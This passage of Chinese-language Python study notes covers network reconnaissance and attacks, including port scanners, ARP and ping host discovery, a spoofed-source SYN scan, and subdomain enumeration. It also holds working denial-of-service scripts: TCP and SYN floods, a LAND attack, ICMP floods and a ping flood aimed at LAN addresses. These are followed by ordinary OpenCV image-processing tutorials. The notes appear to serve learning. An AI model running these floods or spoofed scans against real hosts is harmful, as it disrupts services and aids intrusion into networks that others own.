	# encrypt('./aini.jpg')
	# decrypt('./aini.jpg.enc')
	dir_handle('../aini')
```

## 13-4 质数的处理

```
两个质数相乘 61 * 53 = 3233 这个3233只有这两个因子，没有别的因子
```

给定一个数，求他的乘积因子，并确保一定是质数

```Python
# 质数的因子求解
def is_prime(n):
	for i in range(2,n):
		if n % i == 0:
			return False
	return True

## 给定一个数，求他的乘积因子，并确保一定是质数
def prime_pq(n):
	for p in range(1,n):
		for q in range(1,n):
			if p * q == n and is_prime(p) and is_prime(q):
				print(p,q)
				return True

if __name__ == '__main__':
	prime_pq(3233)
```

优化后的算法

```Python
# 质数的因子求解
import math
def is_prime(n):
	loop = int(math.sqrt(n)) + 1
	for i in range(3,loop,2):
		if n % i == 0:
			return False
	return True

## 给定一个数，求他的乘积因子，并确保一定是质数
def prime_pq(n):
	for p in range(1,(n // 2) + 1):
		for q in range(1,(n // 2) + 1):
			if p * q == n :
				if is_prime(p):
					if is_prime(q):
						print(p,q)
						return True

if __name__ == '__main__':
	prime_pq(967381)
```

## 13-5 Python扫描可用端口

```python
## 端口扫描
## 对目标IP进行进行端口扫描，尝试连接IP和端口
# 单线程
import socket
def socket_port(ip):
	for port in range(1,100):
		try:
			s = socket.socket()
			s.settimeout(0.1)
			s.connect((ip,port))
			print(f'端口:-----{port}可用 ----------- yes')
		except socket.timeout:
			pass
		except:
			pass

# 基于多线程进行端口扫描
def socket_port_thread(ip,start):
	for port in range(start,start+50):
		try:
			s = socket.socket()
			s.settimeout(0.01)
			s.connect((ip,port))
			print(f'端口:-----{port}可用 ----------- yes')
		except:
			pass



from threading import Thread
port_list = [22,25,80,443,3306,1521]
if __name__ == "__main__":
	# socket_port('192.168.31.162')
	for i in range(1,10000,50):
		Thread(target=socket_port_thread,args=('192.168.31.160',i)).start()
```

优化思路，对常用端口进行优先扫描 

```python
## 优化思路：对常用端口进行优先扫描
import socket
import time

def socket_port_noramal(ip):
	list = [7,21,22,23,25,53,67,68,69,79,80,81,88,109,110,113,135,137,138,139,143,161,162,179,194,220,389,443,445,465,513,520,546,547,554,563,631,636,991,993,995,1080,1194,1433,1434,1494,1521,1701,1723,1755,1812,1813,1863,3269,3306,3307,3389,3544,4369,5060,5061,5355,5432,5671,5672,6379,7001,8080,8081,8088,8443,8883,8888,9443,9988,15672,50389,61613,61614]
	for port in list:
		try:
			s = socket.socket()
			s.settimeout(0.01)
			s.connect((ip,port))
			print(f'端口:-----{port}可用 ----------- yes')
		except:
			pass

if __name__ == "__main__":
	socket_port_noramal('192.168.31.162')
```

## 13-6 用Python进行IP扫描

### 6-1 Ping扫描

```python
## 如果要内网渗透，则必须要知道哪些IP地址是存活的，可访问的
## IP地址工作在IP层，ICMP，ARP协议也存在IP信息
## 先使用ping 命令进行IP探测,不过一旦防火墙禁止ICMP协议，那么也会扫不出来
import socket,threading,os
def ping_ip():
	for i in range(1,255):
		ip = f'192.168.31.{i}'
		res = os.popen(f'ping -n 1 -w 100 {ip}').read()
		if 'TTL=' in res:
			print(f'ip {ip} online')

		## 第二种过滤，直接在命令里过滤
		# res = os.popen(f'ping -n 1 -w 100 {ip} | findstr TTL=').read()
		# if len(res) > 0:
		# 	print(f'ip {ip} online')
ping_ip()
```

### 6-2 ARP协议

#### 6-2-1 单线程

```Python
import scapy
from scapy.layers.l2 import ARP
from scapy.sendrecv import sr1

## 设置日志级别，不让错误信息打印出来
import logging
logging.getLogger('scary.runtime').setLevel(logging.ERROR)

def scapy_ip():
	for i in range(1,255):
		ip = f'192.168.31.{i}'
		try:
			pkg = ARP(psrc='192.168.31.17', pdst=ip)
			reply = sr1(pkg, timeout=3, verbose=False)
			print(f'IP {ip} online ----- {reply[ARP].hwsrc} ')
		except:
			pass

if __name__ == '__main__':
	scapy_ip()
```

#### 6-2-2 多线程

```python
import threading
from scapy.layers.l2 import ARP
from scapy.sendrecv import sr1
import scapy

## 设置日志级别，不让错误信息打印出来
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

def scapy_ip(start):
	for i in range(start,start+20):
		ip = f'192.168.31.{i}'
		try:
			pkg = ARP(psrc='192.168.31.17', pdst=ip)
			reply = sr1(pkg, timeout=3, verbose=False)
			print(f'IP {ip} online ----- {reply[ARP].hwsrc} ')
		except:
			pass

if __name__ == '__main__':
	for i in range(1,255,20):
		threading.Thread(target=scapy_ip,args=(i,)).start()
```

#### 6-2-3 扫描端口

```python
## 基于半链接，SYN / SYN,ACK / RA等标志位来对端口进行判断
## 如果目标端口开放，则 SYN -> SYN,ACK; 如果目标端口未开放，则SYN -> RA

import threading

from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import ARP
from scapy.sendrecv import sr1
import scapy

## 设置日志级别，不让错误信息打印出来
import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

def scapy_port(ip):
	# 通过指定源IP地址，可以进行IP欺骗，进而导致半链接，此列操作也可以用于flags参数定义上
	for port in range(20,100):
		try:
			pkg = IP(src = '192.168.31.17', dst = ip)/TCP(dport=port,flags='S')
			reply = sr1(pkg,timeout=1,verbose=False)
			res = reply[TCP].flags
			if res == 0x12:
				print(f"{port} 开放")
		except:
			pass

scapy_port('192.168.31.162')
```

## 13-7 scapy 模拟完整三次握手过程

```Python
## 利用scapy 完成三次握手：五元组：源IP，源端口，协议，目标IP，目标，S，SA，A，SEQ，ACK
import random

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr1

import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

seq = random.randint(10000,20000)
## 第一次TCP握手过程
pkg_1 = IP(dst='192.168.31.160')/TCP(dport=80,flags='S',seq=seq)
## 第二次TCP握手过程(就是接受相应）
reply = sr1(pkg_1)

## 提取第二次握手的seq和ack值
seq = reply[TCP].ack
ack = reply[TCP].seq + 1

## 第三次握手
pkg_2 = IP(dst='192.168.31.160')/TCP(dport=80,flags='A',seq=seq,ack=ack)
sr1(pkg_2)

```

## 13-8 收集子域名

### 8-1 ping命令+ 域名字典进行收集

```Python
## 基于ping 进行子域名扫描
import os
def ping_domain(P_domain):
	## xxx是二级域名字典
	with open('xxx') as f:
		domain_list = f.readlines()

	for domain in domain_list:
		full_domain = f'{domain.strip()}.{P_domain}'
		result = os.popen(f'ping -n 1 -w 1000 {full_domain}').read()
		if '请求超时' in result or "TTL=" in result:
			print(f'{full_domain} 存在')
		if "找不到主机" not in result:
			print(f'{full_domain} 存在')
```

### 8-2 基于socket库

```python
import socket
## 基于socket库DNS解析记录实现扫描
def socket_domain(P_domain):
	## 读取域名字典文件
	with open('xxx') as f:
			domain_list = f.readlines()
	for domain in domain_list:
		try:
			full_domain = f'{domain.strip()}.{P_domain}'
			ip = socket.gethostbyname(full_domain)  
			## 如果这个域名存在则会返回IP地址,不存在报 socket.gaierror
			print(f"{ip} ------  {full_domain}")
		except socket.gaierror:
			pass
		except:
			pass
```

## 13-9 泛洪攻击

### 13-9-1 基于TCP全连接

```Python
import socket
from threading import Thread
## 基于TCP三次握手泛洪
def socket_flood():
	while True:
		s = socket.socket()
		s.connect(('192.168.31.162',3306))

if __name__ == '__main__':
	for i in range(500):
		Thread(target=socket_flood).start()
```

### 13-9-2 基于scapy半连接

```python
def scapy_flood(ip,port):
	while True:
		sport = random.randint(10000,30000)
		pkg = IP(src='192.168.31.17',dst=ip)/TCP(sport=sport,dport=port,flags='S')
		send(pkg, verbose=False)
if __name__ == '__main__':
	for i in range(500):
		Thread(target=scapy_flood,args=('192.168.31.162',3306)).start()
```

### 13-9-3 基于TCP

```python
## 源IP跟目标IP一样		
def tcp_land(ip,port):
	while True:
		sport = random.randint(10000,30000)
		pkg = IP(src=ip,dst=ip)/TCP(sport=sport,dport=port,flags='S')
		send(pkg, verbose=False)
if __name__ == '__main__':
	for i in range(500):
		Thread(target=tcp_land,args=('192.168.31.162',3306)).start()
```

### 13-9-4 ICMP泛洪

```python
## ICMP泛洪
def icmp_flood():
	while True:
		payload = 'Hello'
		pkg = IP(dst='192.168.31.160')/ICMP()/payload*200 ## 一次性发200个数据包
        ## pkg = IP(src = "192.168.31.xx',dst='192.168.31.160')/ICMP()/payload*200 一次性发200个数据包
		send(pkg,verbose=False)
if __name__ == '__main__':
	for i in range(500):
		Thread(target=icmp_flood,).start()
```

### 13-9-5 ICMP广播风暴

```Python  
## ICMP 广播风暴
def icmp_broadcast():
	while True:
		payload = 'hello aini it is me'*100
		pkg = IP(dst='192.168.31.160') / ICMP() / payload*200
		send(pkg, verbose=False)
 if __name__ == '__main__':
	for i in range(500):
		Thread(target=icmp_broadcast,).start()
```

### 13-9-6 ping泛洪(LINUX可以使用，直接终端进行ping泛洪)

```
ping -i 0.001 -s 2000 192.168.112.188
```

# 十八，openCV基础

**说明：笔记是跟着B站黑马程序员的openCV课程时做的**

**课程资料可以在黑马程序员评论区获取**

## 1，图像基本操作

### 1-1 图像基础操作

#### 1-1-1 安装相关库

```python
pip install opencv-python
pip install opencv-contrib-python 

## 尽量保持两个库安装的版本，比如我都是4.9.0.80
opencv-contrib-python         4.9.0.80
opencv-python                 4.9.0.80

```

#### 1-1-2 导入使用

```python
import cv2
import matplotlib.pyplot  as plt
import numpy as np
```

#### 1-1-3 导入图片

##### 1-3-1 cv2.imshow()   显示图片

参数：

- 显示图像的窗口名称，以字符串类型表示
- 要加载的图像

**注意：在调用显示图像的API后，要调用cv.waitKey()给图像绘制留下时间，否则窗口会出现无响应情况，并且图像无法显示出来**。

```python
img = cv2.imread('./img/01.jpg')
print(img)

## 图像的显示
cv2.imshow('image',img)
## 等待时间，毫秒级。0表示任意键终止
cv2.waitKey(0)
cv2.destroyAllWindows()
```

- cv.IMREAD*COLOR：以彩色模式加载图像，任何图像的透明度都将被忽略。这是默认参数。
- cv.IMREAD*GRAYSCALE：以灰度模式加载图像
- cv.IMREAD_UNCHANGED：包括alpha通道的加载图像模式。

```python
## 第二个参数，设置彩色还是灰度
img = cv2.imread('./img/01.jpg',cv2.IMREAD_GRAYSCALE )

# 以灰度图的形式读取图像
img = cv.imread('messi5.jpg',0)
```

##### 1-3-2 matplotlib 显示图片

彩色图

```python
import matplotlib.pyplot  as plt
img = cv2.imread('./img/01.jpg')
plt.imshow(img[:,:,::-1])
plt.show()
```

灰度图

```python
import matplotlib.pyplot  as plt
img = cv2.imread('./img/01.jpg'，0)
plt.imshow(img,cmap=plt.cm.gray)
plt.show()
```



#### 1-1-4 图片保存

参数：

- 文件名，要保存在哪里
- 要保存的图像

```python
# 路径和保存的图片
cv2.imwrite('nwe_img.png',img)
```

```Python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt
# 1 读取图像
img = cv.imread('messi5.jpg',0)
# 2 显示图像
# 2.1 利用opencv展示图像
cv.imshow('image',img)
# 2.2 在matplotplotlib中展示图像
plt.imshow(img[:,:,::-1])
plt.title('匹配结果'), plt.xticks([]), plt.yticks([])
plt.show()
k = cv.waitKey(0)
# 3 保存图像
cv.imwrite('messigray.png',img)
```



#### 1-1-5 视频的读取

```python
# 不指定文件可以捕获摄像头
vc = cv2.VideoCapture()

## 指定文件路径，可以读取视频
vc = cv2.VideoCapture('test.mp4')

## 判断视频能否打得开
if vc.isOpened():
	open,frame = vc.read()
else:
	open = False
```

```Python
while open:
	ret,frame = vc.read()
	if frame is None:
		break
	if ret == True:
        ## 转换成黑白图
		gray = cv2.cvtColor(frame,cv2.COLOR_BGR2GRAY)
		cv2.imshow('result',gray)
        ## 100 是指处理完一帧等待的时间，单位是ms
		if cv2.waitKey(10) & 0xFF == 27:
			break
vc.release()
cv2.destroyAllWindows()
```

#### 1-1-6 截取部分图像数据

```python
img =cv2.imread('./img/01.jpg')
cat = img[0:200,0:200]
cv2.imshow('cat',cat)
```

#### 1-1-7 颜色通道提取

```python
b,g,r = cv2.split(img)
print(r.shape)
```

#### 1-1-8 通道的合并

```
img = cv2.merge(b,g,r)
img.shape
```

#### 1-1-9 只提取某个通道

##### 1-9-1 只保留R

```python
img =cv2.imread('./img/01.jpg')
cur_img = img.copy()
cur_img[:,:,0] = 0
cur_img[:,:,1] = 0
cv2.imshow('R',cur_img)

cv2.waitKey(0)
cv2.destroyAllWindows()
```

##### 1-9-2 只保留G

```python
img =cv2.imread('./img/01.jpg')
cur_img = img.copy()
cur_img[:,:,0] = 0
cur_img[:,:,2] = 0
cv2.imshow('G',cur_img)

cv2.waitKey(0)
cv2.destroyAllWindows()
```

##### 1-9-3 只保留B

```python
img =cv2.imread('./img/01.jpg')
cur_img = img.copy()
cur_img[:,:,1] = 0
cur_img[:,:,2] = 0
cv2.imshow('B',cur_img)

cv2.waitKey(0)
cv2.destroyAllWindows()
```

#### 1-1-10 边界填充

cv2.BORDER_REPLICATE ： 复制法，也就是复制最边缘像素

cv2.BORDER_REFLECT ： 反射法，对感兴趣的图像中的像素在两边进行复制

cv2.BORDER_REFLECT_101： 反射法，也就是以最边缘像素为轴，对称

cv2.BORDER_WRAP：外包装法

cv2.BORDER_CONSTANT：常量法：常数值填充

```Python
top_size,bottom_size,left_size,right_size = (50,50,50,50)
img = cv2.imread('./img/01.jpg')

replicate = cv2.copyMakeBorder(img,top_size,bottom_size,left_size,right_size,borderType=cv2.BORDER_REPLICATE)
reflect = cv2.copyMakeBorder(img,top_size,bottom_size,left_size,right_size,borderType=cv2.BORDER_REFLECT)
reflect101 = cv2.copyMakeBorder(img,top_size,bottom_size,left_size,right_size,borderType=cv2.BORDER_REFLECT_101)
wrap = cv2.copyMakeBorder(img,top_size,bottom_size,left_size,right_size,borderType=cv2.BORDER_WRAP)
constant = cv2.copyMakeBorder(img, top_size, bottom_size, left_size, right_size, borderType=cv2.BORDER_CONSTANT, value=0)

cv2.imshow('B',img)

cv2.waitKey(0)
cv2.destroyAllWindows()
```



#### 1-1-11，图像上绘制直线

##### 1-11-1 绘制直线

```
cv.line(img,start,end,color,thickness)

cv.line(img,(0,0),(511,511),(255,0,0),5)
```

参数：

- img:要绘制直线的图像
- Start,end: 直线的起点和终点
- color: 线条的颜色
- Thickness: 线条宽度

##### 1-11-2 绘制圆形

```python
cv.circle(img,centerpoint, r, color, thickness)
cv.circle(img,(447,63), 63, (0,0,255), -1)
```

参数：

- img:要绘制圆形的图像
- Centerpoint, r: 圆心和半径
- color: 线条的颜色
- Thickness: 线条宽度，为-1时生成闭合图案并填充颜色

##### 1-11-3 绘制矩形

```python
cv.rectangle(img,leftupper,rightdown,color,thickness)
cv.rectangle(img,(384,0),(510,128),(0,255,0),3)
```

参数：

- img:要绘制矩形的图像
- Leftupper, rightdown: 矩形的左上角和右下角坐标
- color: 线条的颜色
- Thickness: 线条宽度

##### 1-11-4 向图像中添加文字

```python
cv.putText(img,text,station, font, fontsize,color,thickness,cv.LINE_AA)

cv.putText(img,'OpenCV',(10,500), font, 4,(255,255,255),2,cv.LINE_AA)
```

参数：

- img: 图像
- text：要写入的文本数据
- station：文本的放置位置
- font：字体
- Fontsize :字体大小

##### 1-11-5 效果展示

我们生成一个全黑的图像，然后在里面绘制图像并添加文字

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt
# 1 创建一个空白的图像
img = np.zeros((512,512,3), np.uint8)
# 2 绘制图形
cv.line(img,(0,0),(511,511),(255,0,0),5)
cv.rectangle(img,(384,0),(510,128),(0,255,0),3)
cv.circle(img,(447,63), 63, (0,0,255), -1)
font = cv.FONT_HERSHEY_SIMPLEX
cv.putText(img,'OpenCV',(10,500), font, 4,(255,255,255),2,cv.LINE_AA)
# 3 图像展示
plt.imshow(img[:,:,::-1])
plt.title('匹配结果'), plt.xticks([]), plt.yticks([])
plt.show()
```

#### 1-1-12，获取图像中的像素点

我们可以通过行和列的坐标值获取该像素点的像素值。对于BGR图像，它返回一个蓝，绿，红值的数组。对于灰度图像，仅返回相应的强度值。使用相同的方法对像素值进行修改。

```python
import numpy as np
import cv2 as cv
img = cv.imread('messi5.jpg')
# 获取某个像素点的值
px = img[100,100]
# 仅获取蓝色通道的强度值
blue = img[100,100,0]
# 修改某个位置的像素值
img[100,100] = [255,255,255]
```

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt

img = np.zeros((256,256,3),np.uint8)
plt.imshow(img[:,:,::-1])
```

![image-20240127103502255](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127103502255.png)

```python
# 获取（100,100）处的像素值
img[100,100]

## # 仅获取蓝色通道的强度值
img[100,100,0]

## 修改某一点的像素值
img[100,100] = (0,0,255)
```

![image-20240127103738037](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127103738037.png)

#### 1-1-13 ，获取图像的属性

图像属性包括行数，列数和通道数，图像数据类型，像素数等。

![image-20240126173746529](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240126173746529.png)

```python
img.shape   ## （256,256,3） 256*256 的三个通道的
```

```python
img.dtype   ## dtype('uint8')
```

```Python
img.size   ## 196608
```

#### 1-1-14，图像通道的拆分与合并

有时需要在B，G，R通道图像上单独工作。在这种情况下，需要将BGR图像分割为单个通道。或者在其他情况下，可能需要将这些单独的通道合并到BGR图像。你可以通过以下方式完成。

```python
# 通道拆分
b,g,r = cv.split(img)
# 通道合并
img = cv.merge((b,g,r))
```



```python
dili = cv.imread("./image/dili.jpg")
plt.imshow(dili[:,:,::-1])


b,g,r = cv.split(dili)
## b通道灰色显示
plt.imshow(b,cmap=plt.cm.gray)

# 通道合并
img2 = cv.merge((b,g,r))
plt.imshow(img2[:,:,::-1])
```



#### 1-1-15，色彩空间的改变

OpenCV中有150多种颜色空间转换方法。最广泛使用的转换方法有两种，BGR↔Gray和BGR↔HSV。

API：

```python
cv.cvtColor(input_image，flag)
```

参数：

- input_image: 进行颜色空间转换的图像
- flag: 转换类型
  - cv.COLOR_BGR2GRAY : BGR↔Gray
  - cv.COLOR_BGR2HSV: BGR→HSV

```python
# 转换成灰度图片
gray = cv.cvtColor(dili,cv.COLOR_BGR2GRAY)
plt.imshow(gray,cmap=plt.cm.gray)

# 转换成hsv
hsv = cv.cvtColor(dili,cv.COLOR_BGR2HSV)
plt.imshow(hsv)

```

![image-20240127112859417](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127112859417.png)

#### 1-1-16 总结

1. 图像IO操作的API：

   ```python
   cv.imread(): ## 读取图像
   cv.imshow()：## 显示图像
   cv.imwrite(): ## 保存图像
   ```

2. 在图像上绘制几何图像

   ```python
   cv.line(): ## 绘制直线
   cv.circle(): ## 绘制圆形
   cv.rectangle(): ## 绘制矩形
   cv.putText(): ## 在图像上添加文字
   ```

   

3. 直接使用行列索引获取图像中的像素并进行修改

4. 图像的属性

   ![image-20240127104906057](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127104906057.png)

5. 拆分通道：cv.split()

   通道合并：cv.merge()

6. 色彩空间的改变

   cv.cvtColor(input_image，flag)

### 1-2 算数操作

#### 1-2-1 图像的加法

你可以使用OpenCV的cv.add()函数把两幅图像相加，或者可以简单地通过numpy操作添加两个图像，如res = img1 + img2。两个图像应该具有相同的大小和类型，或者第二个图像可以是标量值。

**注意：OpenCV加法和Numpy加法之间存在差异。OpenCV的加法是饱和操作，而Numpy添加是模运算。**

参考以下代码：

```python
import numpy as np
>>> x = np.uint8([250])
>>> y = np.uint8([10])
>>> print( cv.add(x,y) ) # 250+10 = 260 => 255
[[255]]
>>> print( x+y )          # 250+10 = 260 % 256 = 4  取模
[4]
```

这种差别在你对两幅图像进行加法时会更加明显。OpenCV 的结果会更好一点。所以我们尽量使用 OpenCV 中的函数。

我们将下面两幅图像：

![image-20240127113853959](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127113853959.png)

代码：

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt

# 1 读取图像
img1 = cv.imread("view.jpg")
img2 = cv.imread("rain.jpg")

# 2 加法操作
img3 = cv.add(img1,img2) # cv中的加法
img4 = img1+img2 # 直接相加

# 3 图像显示
fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100)
axes[0].imshow(img3[:,:,::-1])
axes[0].set_title("cv中的加法")
axes[1].imshow(img4[:,:,::-1])
axes[1].set_title("直接相加")
plt.show()
```

结果如下所示：

![image-20240127113914437](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127113914437.png)

#### 1-2-1 图像的混合

这其实也是加法，但是不同的是两幅图像的权重不同，这就会给人一种混合或者透明的感觉。图像混合的计算公式如下：

> g(x) = (1−α)f0(x) + αf1(x)

通过修改 α 的值（0 → 1），可以实现非常炫酷的混合。

现在我们把两幅图混合在一起。第一幅图的权重是0.7，第二幅图的权重是0.3。函数cv2.addWeighted()可以按下面的公式对图片进行混合操作。

> dst = α⋅img1 + β⋅img2 + γ

这里γ取为零。

参考以下代码：

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt

# 1 读取图像
img1 = cv.imread("view.jpg")
img2 = cv.imread("rain.jpg")

# 2 图像混合
img3 = cv.addWeighted(img1,0.7,img2,0.3,0)  # α⋅img1 + β⋅img2 + γ 对应五个参数

# 3 图像显示
plt.figure(figsize=(8,8))
plt.imshow(img3[:,:,::-1])
plt.show()
```

窗口将如下图显示：

![image-20240127114312212](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127114312212.png)

#### 1-2-3  总结

1. 图像加法：将两幅图像加载一起

   cv.add()

2. 图像的混合：将两幅图像按照不同的比例进行混合

   cv.addweight()

注意：这里都要求两幅图像是相同大小的。

## 2，图像处理

### 2-1 几何变换

#### 2-1-1 图像的缩放

缩放是对图像的大小进行调整，即使图像放大或缩小。

1，API

```python
cv2.resize(src,dsize,fx=0,fy=0,interpolation=cv2.INTER_LINEAR)
```

参数：

```python
- src : ## 输入图像
- dsize: ## 绝对尺寸，直接指定调整后图像的大小
- fx,fy: ## 相对尺寸，将dsize设置为None，然后将fx和fy设置为比例因子即可
- interpolation：## 插值方法，
```



![image-20240127115410751](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127115410751.png)

2，演示

```python
import cv2 as cv
# 1. 读取图片
img1 = cv.imread("./image/dog.jpeg")
# 2.图像缩放
# 2.1 绝对尺寸
rows,cols = img1.shape[:2]
res = cv.resize(img1,(2*cols,2*rows),interpolation=cv.INTER_CUBIC)

# 2.2 相对尺寸
res1 = cv.resize(img1,None,fx=0.5,fy=0.5)

# 3 图像显示
# 3.1 使用opencv显示图像(不推荐)
cv.imshow("orignal",img1)
cv.imshow("enlarge",res)
cv.imshow("shrink）",res1)
cv.waitKey(0)

# 3.2 使用matplotlib显示图像
fig,axes=plt.subplots(nrows=1,ncols=3,figsize=(10,8),dpi=100)
axes[0].imshow(res[:,:,::-1])
axes[0].set_title("绝对尺度（放大）")
axes[1].imshow(img1[:,:,::-1])
axes[1].set_title("原图")
axes[2].imshow(res1[:,:,::-1])
axes[2].set_title("相对尺度（缩小）")
plt.show()
```

![image-20240127115623128](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127115623128.png)

#### 2-1-2 图像平移

图像平移将图像按照指定方向和距离，移动到相应的位置。

API

```python
cv.warpAffine(img,M,dsize)
```

参数：

![image-20240127120134079](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127120134079.png)

需求是将图像的像素点移动(50,100)的距离：

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt
# 1. 读取图像
img1 = cv.imread("./image/image2.jpg")

# 2. 图像平移
rows,cols = img1.shape[:2]
M = np.float32([[1,0,100],[0,1,50]])# 平移矩阵
dst = cv.warpAffine(img1,M,(cols,rows))

# 3. 图像显示
fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100)
axes[0].imshow(img1[:,:,::-1])
axes[0].set_title("原图")
axes[1].imshow(dst[:,:,::-1])
axes[1].set_title("平移后结果")
plt.show()
```

![image-20240127120154926](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127120154926.png)

#### 2-1-3 图像旋转

图像旋转是指图像按照某个位置转动一定角度的过程，旋转中图像仍保持这原始尺寸。图像旋转后图像的水平对称轴、垂直对称轴及中心坐标原点都可能会发生变换，因此需要对图像旋转中的坐标进行相应转换。

那图像是怎么进行旋转的呢？如下图所示：

![image-20240127120308171](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127120308171.png)

![image-20240127120401130](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127120401130.png)

在OpenCV中图像旋转首先根据旋转角度和旋转中心获取旋转矩阵，然后根据旋转矩阵进行变换，即可实现任意角度和任意中心的旋转效果。

1. API

   ```
   cv2.getRotationMatrix2D(center, angle, scale)
   ```

   参数：

   - center：旋转中心
   - angle：旋转角度
   - scale：缩放比例

   返回：

   - M：旋转矩阵

     调用cv.warpAffine完成图像的旋转

2. 示例

   ```python
   import numpy as np
   import cv2 as cv
   import matplotlib.pyplot as plt
   # 1 读取图像
   img = cv.imread("./image/image2.jpg")
   
   # 2 图像旋转
   rows,cols = img.shape[:2]
   # 2.1 生成旋转矩阵
   M = cv.getRotationMatrix2D((cols/2,rows/2),90,1)
   # 2.2 进行旋转变换
   dst = cv.warpAffine(img,M,(cols,rows))
   
   # 3 图像展示
   fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100)
   axes[0].imshow(img1[:,:,::-1])
   axes[0].set_title("原图")
   axes[1].imshow(dst[:,:,::-1])
   axes[1].set_title("旋转后结果")
   plt.show()
   ```

![image-20240127120429269](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127120429269.png)

#### 2-1-4 仿射变换

图像的仿射变换涉及到图像的形状位置角度的变化，是深度学习预处理中常到的功能,仿射变换主要是对图像的缩放，旋转，翻转和平移等操作的组合。

那什么是图像的仿射变换，如下图所示，图1中的点1, 2 和 3 与图二中三个点一一映射, 仍然形成三角形, 但形状已经大大改变，通过这样两组三点（感兴趣点）求出仿射变换， 接下来我们就能把仿射变换应用到图像中所有的点中，就完成了图像的仿射变换。

![image-20240127123026665](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127123026665.png)

需要注意的是，对于图像而言，宽度方向是x，高度方向是y，坐标的顺序和图像像素对应下标一致。所以原点的位置不是左下角而是右上角，y的方向也不是向上，而是向下。

在仿射变换中，原图中所有的平行线在结果图像中同样平行。为了创建这个矩阵我们需要从原图像中找到三个点以及他们在输出图像中的位置。然后cv2.getAﬃneTransform 会创建一个 2x3 的矩阵，最后这个矩阵会被传给函数 cv2.warpAﬃne。

示例

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt
# 1 图像读取
img = cv.imread("./image/image2.jpg")

# 2 仿射变换
rows,cols = img.shape[:2]
# 2.1 创建变换矩阵
pts1 = np.float32([[50,50],[200,50],[50,200]])
pts2 = np.float32([[100,100],[200,50],[100,250]])
M = cv.getAffineTransform(pts1,pts2)
# 2.2 完成仿射变换
dst = cv.warpAffine(img,M,(cols,rows))

# 3 图像显示
fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100)
axes[0].imshow(img[:,:,::-1])
axes[0].set_title("原图")
axes[1].imshow(dst[:,:,::-1])
axes[1].set_title("仿射后结果")
plt.show()
```

![image-20240127123053591](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127123053591.png)

#### 2-1-5  透射变换

透射变换是视角变化的结果，是指利用透视中心、像点、目标点三点共线的条件，按透视旋转定律使承影面（透视面）绕迹线（透视轴）旋转某一角度，破坏原有的投影光线束，仍能保持承影面上投影几何图形不变的变换。

![image-20240127123435092](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127123435092.png)

![image-20240127123502679](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127123502679.png)

1. 示例

   ```python
   import numpy as np
   import cv2 as cv
   import matplotlib.pyplot as plt
   # 1 读取图像
   img = cv.imread("./image/image2.jpg")
   # 2 透射变换
   rows,cols = img.shape[:2]
   # 2.1 创建变换矩阵
   pts1 = np.float32([[56,65],[368,52],[28,387],[389,390]])
   pts2 = np.float32([[100,145],[300,100],[80,290],[310,300]])
   
   T = cv.getPerspectiveTransform(pts1,pts2)
   # 2.2 进行变换
   dst = cv.warpPerspective(img,T,(cols,rows))
   
   # 3 图像显示
   fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100)
   axes[0].imshow(img[:,:,::-1])
   axes[0].set_title("原图")
   axes[1].imshow(dst[:,:,::-1])
   axes[1].set_title("透射后结果")
   plt.show()
   ```

![image-20240127123550034](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127123550034.png)

#### 2-1-6 图像金字塔

图像金字塔是图像多尺度表达的一种，最主要用于图像的分割，是一种以多分辨率来解释图像的有效但概念简单的结构。

图像金字塔用于机器视觉和图像压缩，一幅图像的金字塔是一系列以金字塔形状排列的分辨率逐步降低，且来源于同一张原始图的图像集合。其通过梯次向下采样获得，直到达到某个终止条件才停止采样。

金字塔的底部是待处理图像的高分辨率表示，而顶部是低分辨率的近似，层级越高，图像越小，分辨率越低。

![image-20240127123631595](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127123631595.png)

1. API

   ```python
   cv.pyrUp(img)       #对图像进行上采样
